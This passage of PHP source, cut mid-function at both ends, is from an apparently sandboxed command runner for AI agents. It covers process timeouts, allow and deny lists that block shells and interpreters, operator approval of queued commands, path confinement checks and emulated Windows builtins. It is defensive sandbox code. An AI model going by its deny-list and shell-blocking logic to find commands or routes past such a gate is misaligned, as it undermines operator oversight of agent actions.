        $proc = @proc_open($argv, $descriptors, $pipes, $cwd, $env);
        if (!is_resource($proc)) {
            return ['ok' => false, 'exit' => -1, 'stdout' => '',
                'stderr' => 'Could not start the process.',
                'truncated' => false, 'timed_out' => false, 'ms' => 0];
        }

        if (isset($pipes[0]) && is_resource($pipes[0])) {
            $stdin = (string)($opts['stdin'] ?? '');
            if ($stdin === '') { fclose($pipes[0]); }
            else { fwrite($pipes[0], substr($stdin, 0, 65536)); fclose($pipes[0]); }
        }

        stream_set_blocking($pipes[1], false);
        stream_set_blocking($pipes[2], false);

        $stdout = $stderr = '';
        $truncated = false;
        $timedOut = false;
        while (true) {
            $read = array_values(array_filter([$pipes[1], $pipes[2]], 'is_resource'));
            $w = $e = null;
            $remaining = $timeout - (microtime(true) - $t0);
            if ($remaining <= 0) { $timedOut = true; break; }
            $ready = @stream_select($read, $w, $e, (int)floor(min(0.2, $remaining)), 0);
            if ($ready === false) { break; }
            if ($ready > 0) {
                foreach ($read as $pipe) {
                    $chunk = fread($pipe, 8192);
                    if ($chunk === false || $chunk === '') { continue; }
                    if ($pipe === $pipes[1]) { $stdout .= $chunk; }
                    else { $stderr .= $chunk; }
                }
            }
            $status = proc_get_status($proc);
            if (!$status['running']) { $exit = $status['exitcode']; break; }
            if (strlen($stdout) + strlen($stderr) > $maxBytes) { $truncated = true; break; }
        }

        // Drain whatever is left, then make sure nothing survives.
        foreach ([1, 2] as $i) {
            if (isset($pipes[$i]) && is_resource($pipes[$i])) {
                $rest = stream_get_contents($pipes[$i]);
                if ($i === 1) { $stdout .= $rest; } else { $stderr .= $rest; }
                fclose($pipes[$i]);
            }
        }
        if ($timedOut) {
            $status = proc_get_status($proc);
            // Kill the whole group: nmap and curl both fork children, and
            // killing only the parent leaves those running.
            @proc_terminate($proc, SIGKILL);
            if (function_exists('posix_kill') && $status['pid'] > 0) {
                @posix_kill(-$status['pid'], SIGKILL);
            }
            proc_close($proc);
        } else {
            proc_close($proc);
            $exit = isset($exit) ? $exit : 0;
        }
        if ($timedOut) { $exit = 124; $stderr .= "\n[terminated after {$timeout}s]"; }

        if (strlen($stdout) > $maxBytes) { $stdout = substr($stdout, 0, $maxBytes); $truncated = true; }
        if (strlen($stderr) > 65536) { $stderr = substr($stderr, 0, 65536); }

        $ms = (int)round((microtime(true) - $t0) * 1000);
        self::audit($program, $argv, $cwd, $exit, $ms, [
            'run' => $runId, 'phase' => 'end', 'kind' => 'exec',
            'agent' => (string)($opts['agent'] ?? ''), 'timeout' => $timedOut,
        ]);

        return [
            'ok' => ($exit === 0 && !$timedOut),
            'exit' => $exit,
            'stdout' => $stdout,
            'stderr' => $stderr,
            'truncated' => $truncated,
            'timed_out' => $timedOut,
            'ms' => $ms,
        ];
    }


    /**
     * The name every policy list compares against.
     *
     * `cmd` and `cmd.exe` are one decision, not two, and Windows does not care
     * about case. Without this the allowlist entry for `grep` silently failed
     * to match the `grep.exe` that Git for Windows actually ships, and -- the
     * dangerous direction -- a deny entry for `bash` did not match `bash.exe`,
     * which is the WSL launcher and a real shell. One normalisation covers
     * both directions instead of asking every operator to list both spellings.
     */
    private static function policyName($name) {
        $n = strtolower(basename((string)$name));
        return (string)preg_replace('/\.(exe|com)$/', '', $n);
    }

    /** Is $program in this list, under either Windows spelling? */
    private static function inPolicyList($program, $list) {
        $want = self::policyName($program);
        foreach ((array)$list as $entry) {
            if (self::policyName($entry) === $want) { return true; }
        }
        return false;
    }

    /**
     * Which argv positions hold filesystem paths, per command.
     *
     * Kept as an explicit table rather than guessed: `grep` leads with a
     * PATTERN and only later args are files, while `find` leads with the path.
     * Guessing wrong would either block legitimate work or let something past,
     * so anything not understood is treated as a path (fail closed) for the
     * commands where that is harmless.
     */
    private static function pathArgSpec($program) {
        $program = self::policyName($program);
        $pathsFrom = [
            'cat' => 1, 'head' => 1, 'tail' => 1, 'ls' => 1, 'stat' => 1,
            'file' => 1, 'du' => 1, 'wc' => 1, 'realpath' => 1, 'basename' => 1,
            'dirname' => 1, 'md5sum' => 1, 'sha256sum' => 1, 'tree' => 1,
            'find' => 1, 'grep' => 2, 'egrep' => 2, 'fgrep' => 2, 'rg' => 2,
            'sed' => 1, 'awk' => 1, 'tar' => 1, 'zcat' => 1, 'gunzip' => 1,
            'gzip' => 1, 'unzip' => 1, 'dd' => 1,
            // Windows spellings of the same operations, plus mkdir/type/more
            // which are cmd builtins with no .exe of their own.
            'dir' => 1, 'type' => 1, 'more' => 1, 'mkdir' => 1, 'base64' => 1,
        ];
        return $pathsFrom[$program] ?? null;
    }

    /** @return string|null a human-readable reason, or null when everything is inside */
    private static function checkArgPaths($argv, $program, $readRoots, $writeRoots, $cwd) {
        $from = self::pathArgSpec($program);
        if ($from === null) { return null; }
        $allowed = array_merge($readRoots, $writeRoots, ['/dev/null', '/proc', '/sys']);

        for ($i = $from; $i < count($argv); $i++) {
            $a = $argv[$i];
            // Skip flags and option values that are obviously not paths.
            if ($a === '' || $a[0] === '-' || strpos($a, '=') !== false) { continue; }
            // URLs and glob metacharacters are not resolved as paths here.
            if (preg_match('#^[a-z][a-z0-9+.-]*://#i', $a)) { continue; }
            if (strpbrk($a, '*?[') !== false) { continue; }

            $isAbsolute = $a[0] === '/'
                || (bool)preg_match('#^[A-Za-z]:[\\\\/]#', $a)
                || strpos($a, '\\\\') === 0;
            $candidate = $isAbsolute ? $a : $cwd . '/' . $a;
            $resolved = self::resolveExisting($candidate);
            if ($resolved === null) { continue; }   // does not exist: nothing to read

            $inside = false;
            foreach ($allowed as $root) {
                if ($resolved === $root || strpos($resolved, $root . '/') === 0) { $inside = true; break; }
            }
            if (!$inside) {
                return sprintf('%s was given the path "%s", which resolves outside the sandbox (%s).',
                    $program, $a, $resolved);
            }
        }
        return null;
    }

    // ---------------------------------------------------------------
    // Out-of-band approval
    // ---------------------------------------------------------------

    /** Pending approvals and one-off grants, with their time limits. */
    const APPROVAL_TTL = 300;        // a request you never answer expires
    const GRANT_TTL = 1800;          // "allow this once" lasts 30 minutes

    /** Park a command for the operator to approve. */
    private static function requestApproval($argv, $cwd, $agent) {
        $d = self::readApprovals();
        self::pruneApprovals($d);
        $id = bin2hex(random_bytes(8));
        $d['pending'][$id] = [
            'argv' => array_values($argv),
            'cwd' => $cwd,
            'agent' => (string)$agent,
            'created' => time(),
        ];
        self::writeApprovals($d);
        return $id;
    }

    private static function approvalPath() {
        return self::appDir() . '/storage/exec-approvals.json';
    }

    private static function readApprovals() {
        try {
            $raw = @file_get_contents(self::approvalPath());
            $d = $raw ? json_decode($raw, true) : null;
            return is_array($d) ? $d : ['pending' => [], 'grants' => []];
        } catch (\Throwable $e) { return ['pending' => [], 'grants' => []]; }
    }

    private static function writeApprovals($d) {
        try {
            $dir = self::appDir() . '/storage';
            if (!is_dir($dir)) { return; }
            @file_put_contents(self::approvalPath(), json_encode($d), LOCK_EX);
        } catch (\Throwable $e) { /* never fail a command over bookkeeping */ }
    }

    private static function pruneApprovals(&$d) {
        $now = time();
        foreach ($d['pending'] as $k => $v) {
            if ($now - (int)($v['created'] ?? 0) > self::APPROVAL_TTL) { unset($d['pending'][$k]); }
        }
        foreach ($d['grants'] as $k => $v) {
            if ($now - (int)($v['at'] ?? 0) > self::GRANT_TTL) { unset($d['grants'][$k]); }
        }
    }

    /** Stable key for an exact argv, so "this command" can be granted. */
    private static function grantKey($argv) {
        return hash('sha256', json_encode(array_values($argv)));
    }

    /**
     * Add/remove a program on an exec list, operating on the EFFECTIVE list.
     *
     * Both exec_allow and exec_deny REPLACE their built-in defaults whenever
     * the config key exists, so appending to the raw config value is wrong
     * when the key is absent: it would shrink the whole default list down to
     * the one entry just decided. These go through execAllowList() /
     * execDenyList() and write the merged result back, so a copy with no
     * custom list keeps every default it had.
     */
    private static function addProgramToList($listKey, $program) {
        $program = basename(trim((string)$program));
        if ($program === '') return null;
        $cfg = Config::loadConfig();
        if (!isset($cfg['sandbox']) || !is_array($cfg['sandbox'])) $cfg['sandbox'] = [];
        $current = $listKey === 'exec_deny'
            ? self::execDenyList($cfg['sandbox'])
            : self::execAllowList($cfg['sandbox']);
        if (self::inPolicyList($program, $current)) return null;
        $current[] = $program;
        $cfg['sandbox'][$listKey] = array_values($current);
        // false = already handled by the caller as a hard error, never as a
        // silent ok. A decision the UI reports as done must be on disk.
        if (!Config::saveConfig($cfg)) return false;
        return $program;
    }

    private static function removeProgramFromList($listKey, $program) {
        $program = basename(trim((string)$program));
        if ($program === '') return false;
        $cfg = Config::loadConfig();
        if (!isset($cfg['sandbox']) || !is_array($cfg['sandbox'])) $cfg['sandbox'] = [];
        $current = $listKey === 'exec_deny'
            ? self::execDenyList($cfg['sandbox'])
            : self::execAllowList($cfg['sandbox']);
        if (!self::inPolicyList($program, $current)) return false;
        $want = self::policyName($program);
        $cfg['sandbox'][$listKey] = array_values(array_filter(
            $current, fn($c) => self::policyName($c) !== $want));
        if (!Config::saveConfig($cfg)) return false;
        return true;
    }

    /**
     * Has this exact command already been granted?
     *
     * Keyed on the WHOLE argv, never on the program name: approving
     * `["rm","-rf","./build"]` must not hand back `rm` for everything.
     */
    private static function alreadyGranted($argv) {
        $d = self::readApprovals();
        self::pruneApprovals($d);
        return isset($d['grants'][self::grantKey($argv)]);
    }

    /**
     * Record an approval decision.
     *
     * `once` grants this exact argv for GRANT_TTL. `always` also appends the
     * program to sandbox.exec_allow so it stops asking. Interpreters are never
     * added to the allowlist by `always` -- allowing `sh` or `python` is
     * identical to allowing every command, so it has to stay a deliberate,
     * config-file edit.
     */
    public static function resolveApproval($id, $decision, $agentName = '') {
        $d = self::readApprovals();
        self::pruneApprovals($d);
        if (!isset($d['pending'][$id])) {
            return ['ok' => false, 'error' => 'That approval request expired or does not exist.'];
        }
        $req = $d['pending'][$id];
        unset($d['pending'][$id]);

        if ($decision === 'deny') {
            // A denial is a durable, reversible list entry -- not a shrug.
            // The program (argv[0], the only thing the gate ever sees) goes on
            // the denylist, which is checked before the allowlist and before
            // any earlier grant, so this also overrides an "allow once" given
            // to the same command minutes ago. It comes off the allowlist at
            // the same time: a program on both lists is refused anyway, but
            // the policy editor flags the contradiction, so leave it clean.
            // (The old `deny:` grant written here was never read by anything.)
            $program = basename((string)($req['argv'][0] ?? ''));
            $denied = $program !== '' ? self::addProgramToList('exec_deny', $program) : null;
            if ($denied === false) {
                // The list did not persist (usually storage/config.json is not
                // writable by the web server). Leave the request pending so the
                // operator can retry, instead of reporting a block that is not
                // on disk.
                return ['ok' => false, 'error' => 'Deny failed: the denylist could not be saved. '
                    . 'Check that storage/config.json is writable by the web server.'];
            }
            $unlisted = $program !== '' ? self::removeProgramFromList('exec_allow', $program) : false;
            self::writeApprovals($d);
            return ['ok' => true, 'decision' => 'deny', 'denied' => $denied, 'unallowlisted' => $unlisted];
        }

        $d['grants'][self::grantKey($req['argv'])] = ['at' => time(), 'argv' => $req['argv']];
        $added = null;
        if ($decision === 'always') {
            // Effective-list merge, not a raw append: on a copy with no custom
            // allowlist the old code wrote exec_allow=[program], silently
            // replacing every default with the one command just approved.
            $added = self::addProgramToList('exec_allow', (string)($req['argv'][0] ?? ''));
            if ($added === false) {
                return ['ok' => false, 'error' => 'Allow failed: the allowlist could not be saved. '
                    . 'Check that storage/config.json is writable by the web server.'];
            }
        }
        self::writeApprovals($d);
        return ['ok' => true, 'decision' => $decision, 'allowlisted' => $added];
    }

    /** Everything waiting on the operator, for the UI. */
    public static function pendingApprovals() {
        $d = self::readApprovals();
        self::pruneApprovals($d);
        self::writeApprovals($d);
        // Include the id: without it the UI can LIST pending commands but can
        // never DECIDE them, because resolveApproval is keyed on the id. This
        // shipped without ids, so every approval button silently failed with
        // "expired or does not exist".
        $out = [];
        foreach ($d['pending'] as $id => $req) {
            $req['id'] = $id;
            $out[] = $req;
        }
        return $out;
    }

    /**
     * Is this sandbox on Windows?
     *
     * Usually DIRECTORY_SEPARATOR is enough. Some PHP builds (MSYS/Cygwin)
     * report "/" even when the configured roots are Windows paths, so the
     * roots are checked too. The answer decides PATH/PATHEXT handling and
     * which shell builtins must be emulated.
     */
    private static function isWindows() {
        static $win = null;
        if ($win !== null) { return $win; }
        if (DIRECTORY_SEPARATOR === '\\') { return $win = true; }
        foreach (array_merge(self::readRoots(), self::writeRoots()) as $root) {
            if (preg_match('#^[A-Za-z]:/#', str_replace('\\', '/', (string)$root))) {
                return $win = true;
            }
        }
        return $win = false;
    }

    /**
     * Directories searched for an allowlisted program.
     *
     * POSIX deliberately uses a fixed PATH, not the web server's, so a writable
     * directory earlier in PATH cannot shadow `grep`. Windows has no such
     * convention: Git for Windows, System32 and per-machine tools each live in
     * their own directory, so the machine PATH is the only useful source.
     * Standard admin-owned locations are appended for services (Apache) whose
     * environment is stripped down to almost nothing.
     */
    private static function programDirs() {
        if (!self::isWindows()) {
            return ['/usr/local/sbin', '/usr/local/bin', '/usr/sbin', '/usr/bin', '/sbin', '/bin'];
        }
        $dirs = [];
        $path = (string)getenv('PATH');
        if ($path !== '') {
            foreach (explode(';', $path) as $dir) {
                $dir = trim(trim($dir), '"');
                if ($dir !== '') { $dirs[] = $dir; }
            }
        }
        $sysRoot = (string)(getenv('SystemRoot') ?: getenv('windir') ?: 'C:\\Windows');
        $programFiles = (string)(getenv('ProgramFiles') ?: 'C:\\Program Files');
        $programFilesX86 = (string)(getenv('ProgramFiles(x86)') ?: '');
        $localAppData = (string)(getenv('LOCALAPPDATA') ?: '');
        $dirs = array_merge($dirs, [
            $sysRoot . '\\System32',
            $sysRoot . '\\System32\\Wbem',
            $sysRoot . '\\System32\\WindowsPowerShell\\v1.0',
            $sysRoot . '\\System32\\OpenSSH',
            $sysRoot,
            // Git for Windows ships the POSIX tools the default allowlist names
            // (ls, cat, grep, sed, awk). Apache services rarely inherit the
            // user PATH that points at them.
            $programFiles . '\\Git\\usr\\bin',
            $programFiles . '\\Git\\bin',
        ]);
        if ($programFilesX86 !== '') {
            $dirs[] = $programFilesX86 . '\\Git\\usr\\bin';
            $dirs[] = $programFilesX86 . '\\Git\\bin';
        }
        if ($localAppData !== '') {
            $dirs[] = $localAppData . '\\Programs\\Git\\usr\\bin';
            $dirs[] = $localAppData . '\\Programs\\Git\\bin';
        }
        $dirs[] = 'C:\\msys64\\usr\\bin';
        $seen = [];
        $out = [];
        foreach ($dirs as $dir) {
            $key = strtolower(rtrim($dir, '\\/'));
            if ($key === '' || isset($seen[$key])) { continue; }
            $seen[$key] = true;
            $out[] = rtrim($dir, '\\/');
        }
        return $out;
    }

    /**
     * Find $program and require it to be a regular executable file.
     *
     * Windows is extension-driven and uses `;` in PATH/PATHEXT. Only `.exe`
     * and `.com` are accepted: `.cmd`/`.bat` need cmd.exe to interpret them,
     * which is exactly the shell this worker is designed not to have.
     */
    /**
     * Public since the Programs launcher landed: it resolves a bare program
     * name against the same directories this allowlist uses, and duplicating
     * that list in a second class is how the two drift apart.
     */
    public static function resolveProgram($program) {
        if (strpbrk($program, self::isWindows() ? '/\\' : '/') !== false) {
            return null;  // no paths from the caller
        }

        if (self::isWindows()) {
            $hasExt = (bool)preg_match('/\.[^\\\\\/]+$/', $program);
            foreach (self::programDirs() as $dir) {
                $base = $dir . '\\' . $program;
                $candidates = $hasExt ? [$base] : [$base . '.exe', $base . '.com'];
                foreach ($candidates as $candidate) {
                    if (!is_file($candidate)) { continue; }
                    $target = realpath($candidate);
                    if ($target !== false && is_file($target)) { return $target; }
                }
            }
            return null;
        }

        foreach (self::programDirs() as $dir) {
            $candidate = $dir . '/' . $program;
            if (!is_file($candidate) || !is_executable($candidate)) { continue; }

            // The symlink ban here was a proxy for "must be a real executable,
            // not a device or fifo" -- but on Debian/Ubuntu /usr/bin/python3 is
            // ALWAYS a symlink to python3.X, and /usr/bin/awk points at mawk.
            // Refusing links made python unreachable on this host regardless of
            // policy. Check the resolved TARGET instead, which is what the rule
            // actually meant.
            //
            // Not an escape: the program name only ever comes from the
            // allow/deny lists, and these PATH directories are root-owned and
            // not writable by the web server, so a symlink here is an operator
            // decision rather than something an agent can plant.
            $target = realpath($candidate);
            if ($target === false || !is_file($target) || !is_executable($target)) {
                continue;   // dangling, or resolves to a device/fifo/dir
            }
            return $target;
        }
        return null;
    }

    /**
     * The child environment. POSIX keeps the deliberately tiny PATH from
     * before; Windows needs SystemRoot, ComSpec and a real PATH or even a
     * resolved .exe can fail to load its DLLs.
     */
    private static function execEnvironment($cwd) {
        if (!self::isWindows()) {
            return [
                'PATH' => implode(':', self::programDirs()),
                'HOME' => $cwd,
                'LANG' => 'C.UTF-8',
                'TERM' => 'dumb',
                // Stop curl/nmap from trying to be clever with a terminal.
                'NO_COLOR' => '1',
            ];
        }

        $sysRoot = (string)(getenv('SystemRoot') ?: getenv('windir') ?: 'C:\\Windows');
        $env = [
            'PATH' => implode(';', self::programDirs()),
            'HOME' => $cwd,
            'USERPROFILE' => (string)(getenv('USERPROFILE') ?: $cwd),
            'SystemRoot' => $sysRoot,
            'windir' => $sysRoot,
            'SystemDrive' => (string)(getenv('SystemDrive') ?: substr($sysRoot, 0, 2)),
            'ComSpec' => (string)(getenv('ComSpec') ?: $sysRoot . '\\System32\\cmd.exe'),
            'PATHEXT' => (string)(getenv('PATHEXT') ?: '.COM;.EXE;.BAT;.CMD'),
            'TEMP' => (string)(getenv('TEMP') ?: sys_get_temp_dir()),
            'TMP' => (string)(getenv('TMP') ?: sys_get_temp_dir()),
            'APPDATA' => (string)(getenv('APPDATA') ?: ''),
            'LOCALAPPDATA' => (string)(getenv('LOCALAPPDATA') ?: ''),
            'ProgramData' => (string)(getenv('ProgramData') ?: ''),
            'ProgramFiles' => (string)(getenv('ProgramFiles') ?: ''),
            'ProgramFiles(x86)' => (string)(getenv('ProgramFiles(x86)') ?: ''),
            'PROCESSOR_ARCHITECTURE' => (string)(getenv('PROCESSOR_ARCHITECTURE') ?: ''),
            'NO_COLOR' => '1',
        ];
        return array_filter($env, fn($v) => $v !== '');
    }

    /**
     * Windows command builtins, implemented in PHP.
     *
     * `echo`, `type`, `pwd` and friends are not .exe files, so a no-shell
     * executor cannot find them. Emulating the harmless ones keeps a model's
     * routine probe (`exec ["echo","hello"]`) working without introducing
     * cmd.exe or a shell parser. Returns null for anything not handled here,
     * which then follows the normal "not installed" path.
     */
    private static function runBuiltin($argv, $cwd, $opts, $timeout, $maxBytes) {
        $program = self::policyName($argv[0] ?? '');
        $args = array_slice($argv, 1);
        $t0 = microtime(true);
        $stdout = '';
        $stderr = '';
        $exit = 0;

        switch ($program) {
            case 'echo':
                $newline = true;
                if (isset($args[0]) && $args[0] === '-n') {
                    $newline = false;
                    array_shift($args);
                }
                $stdout = implode(' ', $args) . ($newline ? PHP_EOL : '');
                break;

            case 'pwd':
                $stdout = $cwd . PHP_EOL;
                break;

            case 'which':
            case 'where':
                foreach ($args as $want) {
                    if ($want === '' || $want[0] === '-') { continue; }
                    $found = self::resolveProgram($want);
                    if ($found === null) {
                        $stderr .= "\"$want\" not found on PATH." . PHP_EOL;
                        $exit = 1;
                    } else {
                        $stdout .= $found . PHP_EOL;
                    }
                }
                if ($stdout === '' && $stderr === '') {
                    $stderr = "usage: $program <command>" . PHP_EOL;
                    $exit = 1;
                }
                break;

            case 'type':
                $want = (string)($args[0] ?? '');
                if ($want === '') {
                    $stderr = "usage: type <file-or-command>" . PHP_EOL;
                    $exit = 1;
                    break;
                }
                $file = self::builtinPath($want, $cwd);
                if (is_file($file)) {
                    [$stdout, $stderr, $exit] = self::builtinRead([$want], $cwd, $opts);
                } else {
                    $found = self::resolveProgram($want);
                    if ($found === null) {
                        $stderr = "\"$want\" not found as a file or on PATH." . PHP_EOL;
                        $exit = 1;
                    } else {
                        $stdout = $found . PHP_EOL;
                    }
                }
                break;

            case 'cat':
            case 'more':
                [$stdout, $stderr, $exit] = self::builtinRead($args, $cwd, $opts);
                break;

            case 'dir':
            case 'ls':
                [$stdout, $stderr, $exit] = self::builtinList($args, $cwd);
                break;

            case 'mkdir':
                $parents = false;
                $targets = [];
                foreach ($args as $a) {
                    if ($a === '-p' || $a === '-pv') { $parents = true; continue; }
                    if ($a !== '' && $a[0] === '-') { continue; }
                    $targets[] = $a;
                }
                if (!$targets) {
                    $stderr = "usage: mkdir [-p] <directory>" . PHP_EOL;
                    $exit = 1;
                    break;
                }
                foreach ($targets as $target) {
                    $path = self::builtinPath($target, $cwd);
                    if (is_dir($path)) { continue; }
                    if (!@mkdir($path, 0777, $parents)) {
                        $stderr .= "mkdir: cannot create \"$target\"" . PHP_EOL;
                        $exit = 1;
                    }
                }
                break;

            case 'head':
            case 'tail':
                [$stdout, $stderr, $exit] = self::builtinLines($args, $cwd, $opts, $program === 'tail');
                break;

            case 'wc':
                [$stdout, $stderr, $exit] = self::builtinWc($args, $cwd, $opts);
                break;

            case 'base64':
                [$stdout, $stderr, $exit] = self::builtinBase64($args, $cwd, $opts);
                break;

            case 'md5sum':
            case 'sha256sum':
                [$stdout, $stderr, $exit] = self::builtinHash($args, $cwd, $program === 'md5sum' ? 'md5' : 'sha256');
                break;

            case 'realpath':
            case 'basename':
            case 'dirname':
                $want = (string)($args[0] ?? '');
                if ($want === '') {
                    $stderr = "usage: $program <path>" . PHP_EOL;
                    $exit = 1;
                    break;
                }
                if ($program === 'realpath') {
                    $real = realpath(self::builtinPath($want, $cwd));
                    if ($real === false) {
                        $stderr = "realpath: $want: no such file or directory" . PHP_EOL;
                        $exit = 1;
                    } else {
                        $stdout = str_replace('\\', '/', $real) . PHP_EOL;
                    }
                } elseif ($program === 'basename') {
                    $stdout = basename($want) . PHP_EOL;
                } else {
                    $stdout = dirname($want) . PHP_EOL;
                }
                break;

            case 'sleep':
                $seconds = max(0.0, (float)($args[0] ?? 0));
                $seconds = min($seconds, (float)$timeout);
                usleep((int)round($seconds * 1000000));
                break;

            case 'uname':
                $flag = (string)($args[0] ?? '-s');
                if ($flag === '-a') { $stdout = php_uname() . PHP_EOL; }
                elseif ($flag === '-m') { $stdout = php_uname('m') . PHP_EOL; }
                elseif ($flag === '-n') { $stdout = php_uname('n') . PHP_EOL; }
                else { $stdout = PHP_OS . PHP_EOL; }
                break;

            case 'id':
                $stdout = 'uid=' . get_current_user() . PHP_EOL;
                break;

            case 'printenv':
                $want = (string)($args[0] ?? '');
                if ($want !== '') {
                    $v = getenv($want);
                    if ($v === false) { $exit = 1; } else { $stdout = $v . PHP_EOL; }
                } else {
                    foreach ((array)getenv() as $k => $v) {
                        $stdout .= "$k=$v" . PHP_EOL;
                    }
                }
                break;

            default:
                return null;
        }

        $truncated = false;
        if (strlen($stdout) > $maxBytes) {
            $stdout = substr($stdout, 0, $maxBytes);
            $truncated = true;
        }
        if (strlen($stderr) > 65536) { $stderr = substr($stderr, 0, 65536); }
        $ms = (int)round((microtime(true) - $t0) * 1000);
        // Handled internally, never spawned -- still one audited run, tagged so
        // the log does not imply a process was started for `dir` or `echo`.
        self::audit($program, $argv, $cwd, $exit, $ms, [
            'run' => substr(bin2hex(random_bytes(6)), 0, 12),
            'phase' => 'end', 'kind' => 'builtin',
            'agent' => (string)($opts['agent'] ?? ''),
        ]);
        return [
            'ok' => $exit === 0,
            'exit' => $exit,
            'stdout' => $stdout,
            'stderr' => $stderr,
            'truncated' => $truncated,
            'timed_out' => false,
            'ms' => $ms,
        ];
    }

    /** Resolve a command argument against the jailed working directory. */
    private static function builtinPath($arg, $cwd) {
        $arg = str_replace('\\', '/', (string)$arg);
        if ($arg === '') { return ''; }
        if ($arg[0] === '/' || preg_match('#^[A-Za-z]:/#', $arg)) { return $arg; }
        return rtrim(str_replace('\\', '/', (string)$cwd), '/') . '/' . $arg;
    }

    /** cat/more/type: read files, or stdin when the argument is "-". */
    private static function builtinRead($args, $cwd, $opts) {
        $number = false;
        $nonBlank = false;
        $files = [];
        foreach ($args as $a) {
            if ($a === '-') { $files[] = '-'; continue; }
            if ($a !== '' && $a[0] === '-') {
                if (strpos($a, 'b') !== false) { $nonBlank = true; $number = true; }
                elseif (strpos($a, 'n') !== false) { $number = true; }
                continue;
            }
            $files[] = $a;
        }
        if (!$files) { $files = ['-']; }

        $out = '';
        $err = '';
        $exit = 0;
        foreach ($files as $name) {
            if ($name === '-') {
                $data = (string)($opts['stdin'] ?? '');
            } else {
                $path = self::builtinPath($name, $cwd);
                $data = @file_get_contents($path);
                if ($data === false) {
                    $err .= "cat: $name: no such file or directory" . PHP_EOL;
                    $exit = 1;
                    continue;
                }
            }
            if ($number) {
                $lines = preg_split('/\r\n|\r|\n/', $data);
                $n = 0;
                foreach ($lines as $line) {
                    if ($nonBlank && trim($line) === '') { $out .= $line . PHP_EOL; continue; }
                    $n++;
                    $out .= sprintf("%6d\t%s\n", $n, $line);
                }
            } else {
                $out .= $data;
                if ($data !== '' && substr($data, -1) !== "\n") { $out .= PHP_EOL; }
            }
        }
        return [$out, $err, $exit];
    }

    /** ls/dir: a small, flag-tolerant directory listing. */
    private static function builtinList($args, $cwd) {
        $all = false;
        $long = false;
        $targets = [];
        foreach ($args as $a) {
            if ($a !== '' && $a[0] === '-') {
                if (strpos($a, 'a') !== false) { $all = true; }
                if (strpos($a, 'l') !== false) { $long = true; }
                continue;
            }
            $targets[] = $a;
        }
        if (!$targets) { $targets = ['.']; }

        $out = '';
        $err = '';
        $exit = 0;
        foreach ($targets as $target) {
            $path = self::builtinPath($target, $cwd);
            if (!is_dir($path)) {
                if (is_file($path)) {
                    if (count($targets) > 1) { $out .= "$target:" . PHP_EOL; }
                    if ($long) {
                        $out .= sprintf("%s %10d %s\n", '-', (int)@filesize($path), basename($path));
                    } else {
                        $out .= basename($path) . PHP_EOL;
                    }
                    if (count($targets) > 1) { $out .= PHP_EOL; }
                    continue;
                }
                $err .= "ls: cannot access '$target': no such file or directory" . PHP_EOL;
                $exit = 1;
                continue;
            }
            $names = @scandir($path);
            if ($names === false) {
                $err .= "ls: cannot read '$target'" . PHP_EOL;
                $exit = 1;
                continue;
            }
            sort($names);
            if (!$all) {
                $names = array_values(array_filter($names, fn($n) => $n !== '.' && $n !== '..'));
            }
            if (count($targets) > 1) { $out .= "$target:" . PHP_EOL; }
            foreach ($names as $name) {
                if ($long) {
                    $full = rtrim($path, '/') . '/' . $name;
                    $size = is_dir($full) ? 0 : (int)@filesize($full);
                    $out .= sprintf("%s %10d %s\n", is_dir($full) ? 'd' : '-', $size, $name);
                } else {
                    $out .= $name . PHP_EOL;
                }
            }
            if (count($targets) > 1) { $out .= PHP_EOL; }
        }
        return [$out, $err, $exit];
    }

    /** head/tail: first or last N lines (default 10). */
    private static function builtinLines($args, $cwd, $opts, $tail) {
        $count = 10;
        $files = [];
        for ($i = 0; $i < count($args); $i++) {
            $a = (string)$args[$i];
            if ($a === '-n' && isset($args[$i + 1])) { $count = max(0, (int)$args[++$i]); continue; }
            if (preg_match('/^-(\d+)$/', $a, $m)) { $count = (int)$m[1]; continue; }
            if ($a !== '' && $a[0] === '-') { continue; }
            $files[] = $a;
        }
        if (!$files) { $files = ['-']; }

        $out = '';
        $err = '';
        $exit = 0;
        foreach ($files as $name) {
            if ($name === '-') {
                $data = (string)($opts['stdin'] ?? '');
            } else {
                $data = @file_get_contents(self::builtinPath($name, $cwd));
                if ($data === false) {
                    $err .= "$name: no such file or directory" . PHP_EOL;
                    $exit = 1;
                    continue;
                }
            }
            $lines = preg_split('/\r\n|\r|\n/', rtrim($data, "\r\n"));
            $slice = $tail ? array_slice($lines, -$count) : array_slice($lines, 0, $count);
            $out .= implode(PHP_EOL, $slice);
            if ($slice) { $out .= PHP_EOL; }
        }
        return [$out, $err, $exit];
    }

    /** wc: lines, words and bytes. */
    private static function builtinWc($args, $cwd, $opts) {
        $show = ['l' => false, 'w' => false, 'c' => false];
        $files = [];
        foreach ($args as $a) {
            if ($a !== '' && $a[0] === '-') {
                foreach (str_split(substr($a, 1)) as $f) {
                    if (isset($show[$f])) { $show[$f] = true; }
                }
                continue;
            }
            $files[] = $a;
        }
        if (!$show['l'] && !$show['w'] && !$show['c']) {
            $show = ['l' => true, 'w' => true, 'c' => true];
        }
        if (!$files) { $files = ['-']; }

        $out = '';
        $err = '';
        $exit = 0;
        $total = ['l' => 0, 'w' => 0, 'c' => 0];
        foreach ($files as $name) {
            if ($name === '-') {
                $data = (string)($opts['stdin'] ?? '');
            } else {
                $data = @file_get_contents(self::builtinPath($name, $cwd));
                if ($data === false) {
                    $err .= "wc: $name: no such file or directory" . PHP_EOL;
                    $exit = 1;
                    continue;
                }
            }
            $counts = [
                'l' => substr_count($data, "\n"),
                'w' => count(preg_split('/\s+/', trim($data), -1, PREG_SPLIT_NO_EMPTY)),
                'c' => strlen($data),
            ];
            foreach ($counts as $k => $v) { $total[$k] += $v; }
            $parts = [];
            foreach ($show as $k => $on) { if ($on) { $parts[] = $counts[$k]; } }
            $out .= implode(' ', $parts) . ($name === '-' ? '' : ' ' . $name) . PHP_EOL;
        }
        if (count($files) > 1) {
            $parts = [];
            foreach ($show as $k => $on) { if ($on) { $parts[] = $total[$k]; } }
            $out .= implode(' ', $parts) . ' total' . PHP_EOL;
        }
        return [$out, $err, $exit];
    }

    /** base64: encode or decode files/stdin. */
    private static function builtinBase64($args, $cwd, $opts) {
        $decode = false;
        $wrap = 76;
        $files = [];
        for ($i = 0; $i < count($args); $i++) {
            $a = (string)$args[$i];
            if ($a === '-d' || $a === '--decode') { $decode = true; continue; }
            if ($a === '-w' && isset($args[$i + 1])) { $wrap = max(0, (int)$args[++$i]); continue; }
            if ($a !== '' && $a[0] === '-') { continue; }
            $files[] = $a;
        }
        if (!$files) { $files = ['-']; }

        $out = '';
        $err = '';
        $exit = 0;
        foreach ($files as $name) {
            if ($name === '-') {
                $data = (string)($opts['stdin'] ?? '');
            } else {
